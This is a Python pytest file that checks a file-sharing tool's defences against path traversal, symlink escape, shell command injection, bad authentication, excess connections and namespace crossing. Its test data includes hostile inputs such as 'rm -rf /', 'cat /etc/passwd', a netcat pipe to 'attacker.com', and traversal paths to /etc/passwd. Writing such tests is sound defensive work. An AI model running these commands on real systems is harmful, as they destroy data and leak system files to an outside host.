"""Unit tests for security validation across HTTP, FTP, Mount, SSH, and Enterprise components."""

import json
import os
import shlex
import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, Mock

import pytest


class TestHTTPServerSecurity:
    """Tests for HTTP file server security."""

    @pytest.mark.asyncio
    async def test_http_server_path_traversal_dotdot(self, tmp_path):
        """Test that path traversal with ../ returns 403 Forbidden."""
        from wh.http.server import HTTPFileServer

        # Create test directory with a file
        (tmp_path / "public").mkdir()
        (tmp_path / "public" / "index.html").write_text("<html>Public</html>")
        (tmp_path / "secret.txt").write_text("SECRET DATA")

        manager = MagicMock()
        manager.send_message = AsyncMock()

        server = HTTPFileServer(manager, str(tmp_path / "public"))

        # Attempt path traversal
        request = {
            "type": "http_request",
            "method": "GET",
            "path": "/../../../etc/passwd",
            "headers": {}
        }

        await server._handle_http_request(request)

        # Verify 403 Forbidden response
        response_data = manager.send_message.call_args[0][0]
        response = json.loads(response_data.decode('utf-8'))

        assert response["status_code"] == 403
        assert "Forbidden" in response["body"]
        assert "Path traversal" in response["body"] or "traversal" in response["body"].lower()

    @pytest.mark.asyncio
    async def test_http_server_path_traversal_encoded(self, tmp_path):
        """Test that URL-encoded path traversal returns 403 Forbidden."""
        from wh.http.server import HTTPFileServer

        # Create test directory
        (tmp_path / "public").mkdir()
        (tmp_path / "public" / "index.html").write_text("<html>Public</html>")
        (tmp_path / "secret.txt").write_text("SECRET DATA")

        manager = MagicMock()
        manager.send_message = AsyncMock()

        server = HTTPFileServer(manager, str(tmp_path / "public"))

        # Attempt encoded path traversal: %2e%2e%2f = ../
        request = {
            "type": "http_request",
            "method": "GET",
            "path": "/%2e%2e%2fsecret.txt",
            "headers": {}
        }

        await server._handle_http_request(request)

        response_data = manager.send_message.call_args[0][0]
        response = json.loads(response_data.decode('utf-8'))

        # Should block encoded traversal attempts
        # Either 403 (blocked) or 404 (doesn't exist because encoding preserved)
        assert response["status_code"] in [403, 404]

    @pytest.mark.asyncio
    async def test_http_server_symlink_escape(self, tmp_path):
        """Test that symlink outside root returns 403 Forbidden."""
        from wh.http.server import HTTPFileServer

        # Create test directory structure
        public_dir = tmp_path / "public"
        public_dir.mkdir()
        outside_file = tmp_path / "outside.txt"
        outside_file.write_text("OUTSIDE DATA")

        # Create symlink inside public dir pointing outside
        symlink_path = public_dir / "link_to_outside"
        try:
            symlink_path.symlink_to(outside_file)
        except OSError:
            pytest.skip("Symlinks not supported on this platform")

        manager = MagicMock()
        manager.send_message = AsyncMock()

        server = HTTPFileServer(manager, str(public_dir))

        # Attempt to access file via symlink
        request = {
            "type": "http_request",
            "method": "GET",
            "path": "/link_to_outside",
            "headers": {}
        }

        await server._handle_http_request(request)

        response_data = manager.send_message.call_args[0][0]
        response = json.loads(response_data.decode('utf-8'))

        # Should return 403 when symlink resolves outside serve_dir
        assert response["status_code"] == 403


class TestFTPSecurity:
    """Tests for FTP path traversal security."""

    @pytest.mark.asyncio
    async def test_ftp_path_traversal(self, tmp_path):
        """Test that FTP path escape attempts are blocked."""
        from wh.cli.ftp import FTPProtocol

        # Create FTP protocol with root directory
        root = tmp_path / "ftp_root"
        root.mkdir()
        (root / "public.txt").write_text("PUBLIC")
        (tmp_path / "secret.txt").write_text("SECRET")

        proto = FTPProtocol(root_dir=str(root), is_server=True)

        # Test path traversal attempt
        # The _resolve_path method should raise PermissionError for escaping root
        traversal_path = "../../../etc/passwd"

        # Should raise PermissionError when attempting to escape root
        with pytest.raises(PermissionError, match="Access denied"):
            proto._resolve_path(traversal_path)


class TestMountSecurity:
    """Tests for mount/FUSE path traversal security."""

    @pytest.mark.asyncio
    async def test_mount_path_traversal(self, tmp_path):
        """Test that mount path escape returns EACCES."""
        from wh.cli.mount import MountProtocol

        # Create mount protocol with root directory
        root = tmp_path / "mount_root"
        root.mkdir()
        (root / "allowed.txt").write_text("ALLOWED")

        proto = MountProtocol(root_dir=str(root), is_server=True)

        # Mock protocol for message sending
        mock_protocol = Mock()
        mock_protocol.send = Mock()
        proto._protocol = mock_protocol

        # Attempt path traversal - should raise PermissionError
        traversal_path = "../../../etc/passwd"

        # Should raise PermissionError (which maps to EACCES in FUSE)
        with pytest.raises(PermissionError, match="Access denied"):
            proto._resolve_path(traversal_path)


class TestSSHSecurity:
    """Tests for SSH command injection and authentication security."""

    def test_ssh_command_injection(self):
        """Test that shell metacharacters are properly escaped."""
        # Test potentially dangerous characters that could enable command injection
        dangerous_inputs = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 1234",
            "file.txt`whoami`",
            "file.txt$(whoami)",
            "file.txt;echo pwned",
            "file.txt'||echo pwned||'",
        ]

        for dangerous_input in dangerous_inputs:
            # Using shlex.quote to escape shell metacharacters
            escaped = shlex.quote(dangerous_input)

            # Verify that dangerous characters are neutralized
            # After escaping, the entire string should be treated as single argument
            assert ";" not in escaped or escaped.startswith("'")
            assert "|" not in escaped or escaped.startswith("'")
            assert "`" not in escaped or escaped.startswith("'")
            assert "$(" not in escaped or escaped.startswith("'")

            # The escaped version should be safe to use in shell commands
            # It should be wrapped in quotes or have special chars escaped
            assert escaped.startswith("'") or "\\" in escaped or dangerous_input.isalnum()

    @pytest.mark.asyncio
    async def test_auth_invalid_pubkey(self):
        """Test that invalid public key authentication is rejected."""
        from wh.enterprise.auth import PubkeyAuthenticator
        import nacl.signing
        import nacl.encoding

        # Create temporary authorized keys file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".keys", delete=False) as f:
            # Generate a legitimate key
            legit_key = nacl.signing.SigningKey.generate()
            legit_pubkey_b64 = nacl.encoding.Base64Encoder.encode(
                bytes(legit_key.verify_key)
            ).decode()
            f.write(f"{legit_pubkey_b64} legitimate-key\n")
            keys_file = f.name

        try:
            auth = PubkeyAuthenticator(keys_file)

            # Generate a different (unauthorized) key
            unauthorized_key = nacl.signing.SigningKey.generate()
            unauthorized_pubkey_b64 = nacl.encoding.Base64Encoder.encode(
                bytes(unauthorized_key.verify_key)
            ).decode()

            # Get challenge
            challenge = auth.get_challenge()
            challenge_bytes = nacl.encoding.Base64Encoder.decode(
                challenge["challenge"].encode()
            )

            # Sign with unauthorized key
            signature = unauthorized_key.sign(challenge_bytes).signature
            signature_b64 = nacl.encoding.Base64Encoder.encode(signature).decode()

            # Attempt authentication with unauthorized key
            result = await auth.authenticate({
                "public_key": unauthorized_pubkey_b64,
                "signature": signature_b64,
            })

            # Should be rejected
            assert result.success is False
            assert "not authorized" in result.error.lower()

        finally:
            os.unlink(keys_file)

    @pytest.mark.asyncio
    async def test_auth_invalid_password(self):
        """Test that wrong password authentication is rejected."""
        from wh.enterprise.auth import PasswordAuthenticator

        # Create temporary password file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".passwd", delete=False) as f:
            f.write("testuser:correct_password\n")
            passwd_file = f.name

        try:
            auth = PasswordAuthenticator(passwd_file)

            # Attempt authentication with wrong password
            result = await auth.authenticate({
                "username": "testuser",
                "password": "wrong_password",
            })

            # Should be rejected
            assert result.success is False
            assert "invalid" in result.error.lower()

        finally:
            os.unlink(passwd_file)


class TestRateLimiterSecurity:
    """Tests for rate limiting and throttling."""

    @pytest.mark.asyncio
    async def test_rate_limiter_throttle(self):
        """Test that rate limiting blocks excess requests."""
        from wh.enterprise.rate_limiter import RateLimiter, ConnectionLimitExceeded
        from wh.enterprise.policy import Policy, PolicyConfig, QuotaConfig

        # Create policy with strict limits
        config = PolicyConfig(
            quotas=QuotaConfig(
                max_sessions_per_identity=2,  # Only 2 sessions per identity
                max_concurrent_connections=5,
            ),
        )
        policy = Policy(config)
        limiter = RateLimiter(policy)

        # Create max allowed sessions for an identity
        await limiter.acquire(
            identity="test_user",
            source_ip="192.168.1.1",
            session_id="session1",
        )
        await limiter.acquire(
            identity="test_user",
            source_ip="192.168.1.2",
            session_id="session2",
        )

        # Next request should be blocked (exceeds per-identity limit)
        with pytest.raises(ConnectionLimitExceeded):
            await limiter.acquire(
                identity="test_user",
                source_ip="192.168.1.3",
                session_id="session3",
            )


class TestNamespaceSecurity:
    """Tests for namespace isolation security."""

    def test_namespace_isolation(self):
        """Test that namespace crossing is denied."""
        from wh.enterprise.namespace import Namespace

        # Create two separate namespaces
        ns_engineering = Namespace(
            name="engineering",
            admins=["eng_admin"],
            members=["eng_user1", "eng_user2"],
            public=False,
        )

        ns_sales = Namespace(
            name="sales",
            admins=["sales_admin"],
            members=["sales_user1"],
            public=False,
        )

        # Verify that users from one namespace can't access another
        # Engineering users should not be members of sales namespace
        assert not ns_sales.is_member("eng_user1")
        assert not ns_sales.is_member("eng_user2")
        assert not ns_sales.is_admin("eng_admin")

        # Sales users should not be members of engineering namespace
        assert not ns_engineering.is_member("sales_user1")
        assert not ns_engineering.is_admin("sales_admin")

        # Users should not be able to join namespaces they're not members of
        assert not ns_engineering.can_join("sales_user1")
        assert not ns_sales.can_join("eng_user1")

        # Verify DHT prefixes are different (namespace isolation at DHT level)
        assert ns_engineering.dht_prefix != ns_sales.dht_prefix

        # Test that non-members can't join private namespaces
        outsider = "random_user"
        assert not ns_engineering.is_member(outsider)
        assert not ns_sales.is_member(outsider)
        assert not ns_engineering.can_join(outsider)
        assert not ns_sales.can_join(outsider)
